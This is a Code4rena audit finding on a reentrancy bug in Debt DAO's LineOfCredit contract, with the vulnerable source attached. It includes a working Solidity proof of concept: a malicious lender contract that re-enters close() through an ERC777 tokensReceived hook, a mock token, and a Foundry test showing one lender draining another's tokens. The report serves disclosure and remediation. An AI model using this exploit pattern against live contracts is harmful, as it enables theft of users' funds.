{
  "Title": "[M-05] Reentrancy bug allows lender to steal other lenders funds",
  "Content": "# Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L487\n\n\n# Vulnerability details\n\n## Impact\n\nA reentrancy bug allows in `LineOfCredit.sol` allows the lender to steal other lenders tokens if they are lending the same tokens type (loss of funds). \n\nThe  reentrancy occurs in the `_close(credit, id)` function in `LineOfCredit.sol`. The `credit[id]` state variable is cleared only after sendings tokens to the lender. \nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483\n```\n    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n        if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n        // return the Lender's funds that are being repaid\n        if (credit.deposit + credit.interestRepaid > 0) {\n            LineLib.sendOutTokenOrETH(\n                credit.token,\n                credit.lender,\n                credit.deposit + credit.interestRepaid\n            );\n        }\n\n        delete credits[id]; // gas refunds\n\n        // remove from active list\n        ids.removePosition(id);\n        unchecked { --count; }\n\n        // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n        if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n        emit CloseCreditPosition(id);\n\n        return true;\n    }\n```\n\n\n## Proof of Concept\n\nReentrancy is possible if the borrower is lending tokens that can change the control flow. Such tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions.\nExample of a real-world popular token that can change control flow is PNT (pNetwork). \nAs the protocol supports any token listed on the oracle, if the oracle currently supports (or will support in the future) a feed of the above tokens, the bug is exploitable.\n\nIf a reentrancy occurs in the `_close(credit, id)` function, the `credit[id]` state variable is cleared only after sendings tokens to the lender. \nA lender can abuse this by reentrancy to `close(id)` and retrieve `credit.deposit + credit.interestRepaid` amount of `credit.token`. A lender can repeat this processes as long as LineOfCredit has funds available.\n\nThe POC will demonstrate the following flow:\n1. Borrower  adds a new credit with lender1 on 1000 tokens.\n2. Borrower lends 1000 from lender1\n3. Borrower repays debt \n4. Borrower adds a new credit with lender2 on 1000 tokens\n5. Borrower closes debt with lender1\n6. Lender1 receives 2000 tokens. \n\nAdd the `MockLender.sol` to mock folder.\n```\npragma solidity 0.8.9;\n\nimport { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\nimport { Token777 } from \"./Token777.sol\";\n\ncontract MockLender {\n    address owner;\n    ILineOfCredit line;\n    bytes32 id;\n    bool lock;\n    \n    event GotMoney(uint256 amount);\n\n    constructor(address _line) public {\n        line = ILineOfCredit(_line);\n        owner = msg.sender;\n    }\n\n    function addCredit(\n        uint128 drate,\n        uint128 frate,\n        uint256 amount,\n        address token\n    ) external {\n        require(msg.sender == owner, \"Only callable by owner\");\n        Token777(token).approve(address(line), amount);\n        Token777(token).approve(address(owner), type(uint256).max);\n        Token777(token).mockAddToRegistry();\n        id = line.addCredit(drate, frate, amount, token, address(this));\n    }\n    function tokensReceived(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata userData,\n        bytes calldata operatorData\n    ) external {\n        emit GotMoney(amount);\n        if(!lock){\n            lock = true;\n            line.close(id);\n        }\n    }\n\n    receive() external payable {\n    }\n\n}\n```\n\nAdd `Token777.sol` to mocks folder:\n\n```\npragma solidity 0.8.9;\n\nimport \"openzeppelin/token/ERC20/ERC20.sol\";\ninterface IERC777Recipient {\n    function tokensReceived(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata userData,\n        bytes calldata operatorData\n    ) external;\n}\n\ncontract Token777 is ERC20(\"Token used to trade\", \"777\") {\n    mapping(address => uint256) private _balances;\n    mapping(address => address) private registry;\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    // ERC20-allowances\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    event Test(address);\n\n    constructor() {\n    }\n\n    function mint(address account, uint256 amount) external returns(bool) {\n        _mint(account, amount);\n        return true;\n    }\n\n    function _mint(\n        address account,\n        uint256 amount\n    ) internal virtual override{\n        require(account != address(0), \"ERC777: mint to the zero address\");\n\n        // Update state variables\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Test(account);\n    }\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function approve(address spender, uint256 value) public virtual override returns (bool) {\n        address holder = _msgSender();\n        _approve(holder, spender, value);\n        return true;\n    }\n   function _approve(\n        address holder,\n        address spender,\n        uint256 value\n    ) internal  virtual override {\n        require(holder != address(0), \"ERC777: approve from the zero address\");\n        require(spender != address(0), \"ERC777: approve to the zero address\");\n\n        _allowances[holder][spender] = value;\n        emit Approval(holder, spender, value);\n    }\n    function transferFrom(\n        address holder,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        emit Test(msg.sender);\n        _spendAllowance(holder, spender, amount);\n        _send(holder, recipient, amount, \"\", \"\", false);\n        return true;\n    }\n\n    function allowance(address holder, address spender) public view virtual override returns (uint256) {\n        return _allowances[holder][spender];\n    }\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal override virtual {\n        emit Test(msg.sender);\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC777: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _send(_msgSender(), recipient, amount, \"\", \"\", false);\n        return true;\n    }\n\n    function _send(\n        address from,\n        address to,\n        uint256 amount,\n        bytes memory userData,\n        bytes memory operatorData,\n        bool requireReceptionAck\n    ) internal virtual {\n        require(from != address(0), \"ERC777: transfer from the zero address\");\n        require(to != address(0), \"ERC777: transfer to the zero address\");\n\n        address operator = _msgSender();\n\n        _move(operator, from, to, amount, userData, operatorData);\n\n        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);\n    }\n\n\n    function _move(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes memory userData,\n        bytes memory operatorData\n    ) private {\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC777: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        }\n        _balances[to] += amount;\n    }\n\n    function _callTokensReceived(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes memory userData,\n        bytes memory operatorData,\n        bool requireReceptionAck\n    ) private {\n        address implementer = registry[to];\n        if (implementer != address(0)) {\n            IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);\n        }\n    }\n\n    function mockAddToRegistry() external {\n        registry[msg.sender] = msg.sender;\n    }\n\n}\n```\n\nAdd the following imports to `LineOfCredit.t.sol`:\n\n```\nimport { MockLender } from \"../mock/MockLender.sol\";\nimport { Token777 } from \"../mock/Token777.sol\";\n```\n\nAdd the following test to `LineOfCredit.t.sol`:\n\n```\n\n    function test_reentrancy() public {\n        uint256 lenderOneAmount = 1000;\n        uint256 lenderTwoAmount = 1000;\n        Token777 tokenUsed = new Token777();\n        // Create lenderController \n        address lenderOneController = address(0xdeadbeef);\n        address lender2 = address(0x1337);\n\n        // Create lenderContract \n        vm.startPrank(lenderOneController);\n        MockLender lenderOneContract = new MockLender(address(line));\n        vm.stopPrank();\n\n        // give lenders their lend amount of token\n        tokenUsed.mint(address(lenderOneContract), lenderOneAmount);\n        tokenUsed.mint(address(lender2), lenderTwoAmount);\n\n        // add support of the token to the SimpleOracle\n        oracle.changePrice(address(tokenUsed), 1000 * 1e8); // 1000 USD\n\n        // Borrowers adds credit line from lender2\n        vm.startPrank(borrower);\n        line.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed), address(lenderOneContract));\n        vm.stopPrank();\n\n        // LenderOne adds credit line\n        vm.startPrank(lenderOneController);\n        lenderOneContract.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed));\n        vm.stopPrank();\n\n        //borrow 1 ether\n        bytes32 id_first = line.ids(0);\n        vm.startPrank(borrower);\n        line.borrow(id_first, lenderOneAmount);\n        vm.stopPrank();\n        \n        // Borrowers adds an additional credit line from lender2\n        vm.startPrank(borrower);\n        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed), address(lender2));\n        vm.stopPrank();\n\n        // Lender2 adds an additional credit line from  \n        vm.startPrank(lender2);\n        tokenUsed.approve(address(line), lenderTwoAmount);\n        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed),  address(lender2));\n        vm.stopPrank();\n\n        // repay all debt to lender 1\n        vm.startPrank(borrower);\n        tokenUsed.approve(address(line), lenderOneAmount);\n        line.depositAndRepay(lenderOneAmount);\n        line.close(id_first);\n        vm.stopPrank();\n        \n        //validate that lender1 was able to steal lender2 tokens\n        assert(tokenUsed.balanceOf(address(lenderOneContract)) == lenderOneAmount + lenderTwoAmount);\n    }\n```\n\nTo run the POC execute:\n`forge test -v`\n\nExpected output:\n\n```\n[PASS] test_reentrancy() (gas: 1636410)\nTest result: ok. 1 passed; 0 failed; finished in 1.71ms\n```\n\nTo get full trace execute: \n`forge test -vvvv`\n\n## Tools Used\n\nVS Code, Foundry.\n\n## Recommended Mitigation Steps\n\nSend tokens only at the end of `_close(Credit memory credit, bytes32 id)` or add a reentrancyGuard.",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-11-debt-dao-contest",
  "Code": [
    {
      "filename": "contracts/modules/credit/LineOfCredit.sol",
      "content": "pragma solidity ^0.8.9;\n\nimport { Denominations } from \"chainlink/Denominations.sol\";\nimport { IERC20 } from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {SafeERC20}  from \"openzeppelin/token/ERC20/utils/SafeERC20.sol\";\n\nimport {LineLib} from \"../../utils/LineLib.sol\";\nimport {CreditLib} from \"../../utils/CreditLib.sol\";\nimport {CreditListLib} from \"../../utils/CreditListLib.sol\";\nimport {MutualConsent} from \"../../utils/MutualConsent.sol\";\nimport {InterestRateCredit} from \"../interest-rate/InterestRateCredit.sol\";\n\nimport {IOracle} from \"../../interfaces/IOracle.sol\";\nimport {ILineOfCredit} from \"../../interfaces/ILineOfCredit.sol\";\n\ncontract LineOfCredit is ILineOfCredit, MutualConsent {\n    using SafeERC20 for IERC20;\n\n    using CreditListLib for bytes32[];\n\n    uint256 public immutable deadline;\n\n    address public immutable borrower;\n\n    address public immutable arbiter;\n\n    IOracle public immutable oracle;\n\n    InterestRateCredit public immutable interestRate;\n\n    uint256 private count; // amount of open credit lines on a Line of Credit facility. ids.length includes null items\n\n    bytes32[] public ids; // all open credit lines\n\n    mapping(bytes32 => Credit) public credits; // id -> Reference ID for a credit line provided by a single Lender for a given token on a Line of Credit\n\n    // Line Financials aggregated accross all existing  Credit\n    LineLib.STATUS public status;\n\n    /**\n   * @notice            - How to deploy a Line of Credit\n   * @dev               - A Borrower and a first Lender agree on terms. Then the Borrower deploys the contract using the constructor below.\n   *                      Later, both Lender and Borrower must call _mutualConsent() during addCredit() to actually enable funds to be deposited.\n   * @param oracle_     - The price oracle to use for getting all token values.\n   * @param arbiter_    - A neutral party with some special priviliges on behalf of Borrower and Lender.\n   * @param borrower_   - The debitor for all credit lines in this contract.\n   * @param ttl_        - The time to live for all credit lines for the Line of Credit facility (sets the maturity/term of the Line of Credit)\n  */\n    constructor(\n        address oracle_,\n        address arbiter_,\n        address borrower_,\n        uint256 ttl_\n    ) {\n        oracle = IOracle(oracle_);\n        arbiter = arbiter_;\n        borrower = borrower_;\n        deadline = block.timestamp + ttl_;  //the deadline is the term/maturity/expiry date of the Line of Credit facility\n        interestRate = new InterestRateCredit();\n\n        emit DeployLine(oracle_, arbiter_, borrower_);\n    }\n\n    function init() external virtual returns(LineLib.STATUS) {\n      if(status != LineLib.STATUS.UNINITIALIZED) { revert AlreadyInitialized(); }\n      return _updateStatus(_init());\n    }\n\n    function _init() internal virtual returns(LineLib.STATUS) {\n       // If no collateral or Spigot then Line of Credit is immediately active\n      return LineLib.STATUS.ACTIVE;\n    }\n\n    ///////////////\n    // MODIFIERS //\n    ///////////////\n\n    modifier whileActive() {\n        if(status != LineLib.STATUS.ACTIVE) { revert NotActive(); }\n        _;\n    }\n\n    modifier whileBorrowing() {\n        if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }\n        _;\n    }\n\n    modifier onlyBorrower() {\n        if(msg.sender != borrower) { revert CallerAccessDenied(); }\n        _;\n    }\n\n    /**\n     * @notice - mutualConsent() but hardcodes borrower address and uses the position id to\n                 get Lender address instead of passing it in directly\n     * @param id - position to pull lender address from for mutual consent agreement\n    */\n    modifier mutualConsentById(bytes32 id) {\n      if(_mutualConsent(borrower, credits[id].lender))  {\n        // Run whatever code is needed for the 2/2 consent\n        _;\n      }\n    }\n\n    /**\n     * @notice - evaluates all covenants encoded in _healthcheck from different Line variants\n     * @dev - updates `status` variable in storage if current status is diferent from existing status\n     * @return - current health status of Line\n    */\n    function healthcheck() external returns (LineLib.STATUS) {\n        // can only check if the line has been initialized\n        require(uint(status) >= uint( LineLib.STATUS.ACTIVE));\n        return _updateStatus(_healthcheck());\n    }\n\n    /// see ILineOfCredit.counts\n    function counts() external view returns (uint256, uint256) {\n        return (count, ids.length);\n    }\n\n    function _healthcheck() internal virtual returns (LineLib.STATUS) {\n        // if line is in a final end state then do not run _healthcheck()\n        LineLib.STATUS s = status;\n        if (\n            s == LineLib.STATUS.REPAID ||               // end state - good\n            s == LineLib.STATUS.INSOLVENT               // end state - bad\n        ) {\n            return s;\n        }\n\n        // Liquidate if all credit lines aren't closed by deadline\n        if (block.timestamp >= deadline && count > 0) {\n            emit Default(ids[0]); // can query all defaulted positions offchain once event picked up\n            return LineLib.STATUS.LIQUIDATABLE;\n        }\n\n        // if nothing wrong, return to healthy ACTIVE state  \n        return LineLib.STATUS.ACTIVE;\n    }\n\n\n    /// see ILineOfCredit.declareInsolvent\n    function declareInsolvent() external whileBorrowing returns(bool) {\n        if(arbiter != msg.sender) { revert CallerAccessDenied(); }\n        if(LineLib.STATUS.LIQUIDATABLE != _updateStatus(_healthcheck())) {\n            revert NotLiquidatable();\n        }\n\n        if(_canDeclareInsolvent()) {\n            _updateStatus(LineLib.STATUS.INSOLVENT);\n            return true;\n        } else {\n          return false;\n        }\n    }\n\n    function _canDeclareInsolvent() internal virtual returns(bool) {\n        // logic updated in Spigoted and Escrowed lines\n        return true;\n    }\n\n    /// see ILineOfCredit.updateOutstandingDebt\n    function updateOutstandingDebt() external override returns (uint256, uint256) {\n        return _updateOutstandingDebt();\n    }\n\n    function _updateOutstandingDebt()\n        internal\n        returns (uint256 principal, uint256 interest)\n    {\n        // use full length not count because positions might not be packed in order\n        uint256 len = ids.length;\n        if (len == 0) return (0, 0);\n\n        bytes32 id;\n        address oracle_ = address(oracle);  // gas savings\n        address interestRate_ = address(interestRate); // gas savings\n        \n        for (uint256 i; i < len; ++i) {\n            id = ids[i];\n\n            // null element in array from closing a position. skip for gas savings\n            if(id == bytes32(0)) { continue; }\n\n            (Credit memory c, uint256 _p, uint256 _i) = CreditLib.getOutstandingDebt(\n              credits[id],\n              id,\n              oracle_,\n              interestRate_\n            );\n            // update total outstanding debt\n            principal += _p;\n            interest += _i;\n            // save changes to storage\n            credits[id] = c;\n        }\n    }\n\n    /// see ILineOfCredit.accrueInterest\n    function accrueInterest() external override returns(bool) {\n        uint256 len = ids.length;\n        bytes32 id;\n        for (uint256 i; i < len; ++i) {\n          id = ids[i];\n          Credit memory credit = credits[id];\n          credits[id] = _accrue(credit, id);\n        }\n        \n        return true;\n    }\n\n    /**\n      @notice - accrues token demoninated interest on a lender's position.\n      @dev MUST call any time a position balance or interest rate changes\n      @param credit - the lender position that is accruing interest\n      @param id - the position id for credit position\n    */\n    function _accrue(Credit memory credit, bytes32 id) internal returns(Credit memory) {\n      return CreditLib.accrue(credit, id, address(interestRate));\n    }\n\n    /// see ILineOfCredit.addCredit\n    function addCredit(\n        uint128 drate,\n        uint128 frate,\n        uint256 amount,\n        address token,\n        address lender\n    )\n        external\n        payable\n        override\n        whileActive\n        mutualConsent(lender, borrower)\n        returns (bytes32)\n    {\n        LineLib.receiveTokenOrETH(token, lender, amount);\n\n        bytes32 id = _createCredit(lender, token, amount);\n\n        require(interestRate.setRate(id, drate, frate));\n        \n        return id;\n    }\n\n    /// see ILineOfCredit.setRates\n    function setRates(\n        bytes32 id,\n        uint128 drate,\n        uint128 frate\n    )\n      external\n      override\n      mutualConsentById(id)\n      returns (bool)\n    {\n        Credit memory credit = credits[id];\n        credits[id] = _accrue(credit, id);\n        require(interestRate.setRate(id, drate, frate));\n        emit SetRates(id, drate, frate);\n        return true;\n    }\n\n    /// see ILineOfCredit.increaseCredit\n    function increaseCredit(bytes32 id, uint256 amount)\n      external\n      payable\n      override\n      whileActive\n      mutualConsentById(id)\n      returns (bool)\n    {\n        Credit memory credit = credits[id];\n        credit = _accrue(credit, id);\n\n        credit.deposit += amount;\n        \n        credits[id] = credit;\n\n        LineLib.receiveTokenOrETH(credit.token, credit.lender, amount);\n\n        emit IncreaseCredit(id, amount);\n\n        return true;\n    }\n\n    ///////////////\n    // REPAYMENT //\n    ///////////////\n\n    /// see ILineOfCredit.depositAndClose\n    function depositAndClose()\n        external\n        payable\n        override\n        whileBorrowing\n        onlyBorrower\n        returns (bool)\n    {\n        bytes32 id = ids[0];\n        Credit memory credit = _accrue(credits[id], id);\n\n        // Borrower deposits the outstanding balance not already repaid\n        uint256 totalOwed = credit.principal + credit.interestAccrued;\n        LineLib.receiveTokenOrETH(credit.token, msg.sender, totalOwed);\n\n        // Borrower clears the debt then closes and deletes the credit line\n        _close(_repay(credit, id, totalOwed), id);\n\n        return true;\n    }\n\n\n    /// see ILineOfCredit.depositAndRepay\n    function depositAndRepay(uint256 amount)\n        external\n        payable\n        override\n        whileBorrowing\n        returns (bool)\n    {\n        bytes32 id = ids[0];\n        Credit memory credit = credits[id];\n        credit = _accrue(credit, id);\n\n        require(amount <= credit.principal + credit.interestAccrued);\n\n        credits[id] = _repay(credit, id, amount);\n\n        LineLib.receiveTokenOrETH(credit.token, msg.sender, amount);\n\n        return true;\n    }\n\n    ////////////////////\n    // FUND TRANSFERS //\n    ////////////////////\n\n    /// see ILineOfCredit.borrow\n    function borrow(bytes32 id, uint256 amount)\n        external\n        override\n        whileActive\n        onlyBorrower\n        returns (bool)\n    {\n        Credit memory credit = _accrue(credits[id], id);\n\n        if(amount > credit.deposit - credit.principal) { revert NoLiquidity(); }\n\n        credit.principal += amount;\n\n        credits[id] = credit; // save new debt before healthcheck\n\n        // ensure that borrowing doesnt cause Line to be LIQUIDATABLE\n        if(_updateStatus(_healthcheck()) != LineLib.STATUS.ACTIVE) { \n            revert NotActive();\n        }\n\n        LineLib.sendOutTokenOrETH(credit.token, borrower, amount);\n\n        emit Borrow(id, amount);\n\n        _sortIntoQ(id);\n\n        return true;\n    }\n\n    /// see ILineOfCredit.withdraw\n    function withdraw(bytes32 id, uint256 amount)\n        external\n        override\n        returns (bool)\n    {\n        Credit memory credit = credits[id];\n\n        if(msg.sender != credit.lender) { revert CallerAccessDenied(); }\n\n        // accrues interest and transfers to Lender\n        credits[id] = CreditLib.withdraw(_accrue(credit, id), id, amount);\n\n        LineLib.sendOutTokenOrETH(credit.token, credit.lender, amount);\n\n        return true;\n    }\n\n    /// see ILineOfCredit.close\n    function close(bytes32 id) external payable override returns (bool) {\n        Credit memory credit = credits[id];\n        address b = borrower; // gas savings\n        if(msg.sender != credit.lender && msg.sender != b) {\n          revert CallerAccessDenied();\n        }\n\n        // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off\n        credit = _accrue(credit, id);\n        uint256 facilityFee = credit.interestAccrued;\n        if(facilityFee > 0) {\n          // only allow repaying interest since they are skipping repayment queue.\n          // If principal still owed, _close() MUST fail\n          LineLib.receiveTokenOrETH(credit.token, b, facilityFee);\n\n          credit = _repay(credit, id, facilityFee);\n        }\n\n        _close(credit, id); // deleted; no need to save to storage\n\n        return true;\n    }\n\n    //////////////////////\n    //  Internal  funcs //\n    //////////////////////\n\n    /**\n      * @notice - updates `status` variable in storage if current status is diferent from existing status.\n      * @dev - privileged internal function. MUST check params and logic flow before calling\n      * @dev - does not save new status if it is the same as current status\n      * @return status - the current status of the line after updating\n     */\n    function _updateStatus(LineLib.STATUS status_) internal returns(LineLib.STATUS) {\n      if(status == status_) return status_;\n      emit UpdateStatus(uint256(status_));\n      return (status = status_);\n    }\n\n    /**\n     * @notice - Generates position id and stores lender's position\n     * @dev - positions have unique composite-index on [lineAddress, lenderAddress, tokenAddress]\n     * @dev - privileged internal function. MUST check params and logic flow before calling\n     * @param lender - address that will own and manage position\n     * @param token - ERC20 token that is being lent and borrower\n     * @param amount - amount of tokens lender will initially deposit\n    */\n    function _createCredit(\n        address lender,\n        address token,\n        uint256 amount\n    )\n        internal\n        returns (bytes32 id)\n    {\n        id = CreditLib.computeId(address(this), lender, token);\n        // MUST not double add the credit line. otherwise we can not _close()\n        if(credits[id].lender != address(0)) { revert PositionExists(); }\n\n        credits[id] = CreditLib.create(id, amount, lender, token, address(oracle));\n\n        ids.push(id); // add lender to end of repayment queue\n        \n        unchecked { ++count; }\n\n        return id;\n    }\n\n  /**\n   * @dev - Reduces `principal` and/or `interestAccrued` on a credit line.\n            Expects checks for conditions of repaying and param sanitizing before calling\n            e.g. early repayment of principal, tokens have actually been paid by borrower, etc.\n   * @dev - privileged internal function. MUST check params and logic flow before calling\n   * @param id - position id with all data pertaining to line\n   * @param amount - amount of Credit Token being repaid on credit line\n   * @return credit - position struct in memory with updated values\n  */\n    function _repay(Credit memory credit, bytes32 id, uint256 amount)\n        internal\n        returns (Credit memory)\n    { \n        credit = CreditLib.repay(credit, id, amount);\n\n        // if credit line fully repaid then remove it from the repayment queue\n        if (credit.principal == 0) ids.stepQ();\n\n        return credit;\n    }\n\n    /**\n     * @notice - checks that a credit line is fully repaid and removes it\n     * @dev deletes credit storage. Store any data u might need later in call before _close()\n     * @dev - privileged internal function. MUST check params and logic flow before calling\n     * @return credit - position struct in memory with updated values\n     */\n    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n        if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n        // return the Lender's funds that are being repaid\n        if (credit.deposit + credit.interestRepaid > 0) {\n            LineLib.sendOutTokenOrETH(\n                credit.token,\n                credit.lender,\n                credit.deposit + credit.interestRepaid\n            );\n        }\n\n        delete credits[id]; // gas refunds\n\n        // remove from active list\n        ids.removePosition(id);\n        unchecked { --count; }\n\n        // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n        if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n        emit CloseCreditPosition(id);\n\n        return true;\n    }\n\n    /**\n     * @notice - Insert `p` into the next availble FIFO position in the repayment queue\n               - once earliest slot is found, swap places with `p` and position in slot.\n     * @dev - privileged internal function. MUST check params and logic flow before calling\n     * @param p - position id that we are trying to find appropriate place for\n     * @return - if function executed successfully\n     */\n    function _sortIntoQ(bytes32 p) internal returns (bool) {\n        uint256 lastSpot = ids.length - 1;\n        uint256 nextQSpot = lastSpot;\n        bytes32 id;\n        for (uint256 i; i <= lastSpot; ++i) {\n            id = ids[i];\n            if (p != id) {\n                if (\n                  id == bytes32(0) ||       // deleted element. In the middle of the q because it was closed.\n                  nextQSpot != lastSpot ||  // position already found. skip to find `p` asap\n                  credits[id].principal > 0 //`id` should be placed before `p` \n                ) continue;\n                nextQSpot = i;              // index of first undrawn line found\n            } else {\n                if(nextQSpot == lastSpot) return true; // nothing to update\n                // swap positions\n                ids[i] = ids[nextQSpot];    // id put into old `p` position\n                ids[nextQSpot] = p;         // p put at target index\n                return true; \n            }\n          \n        }\n    }\n}"
    }
  ]
}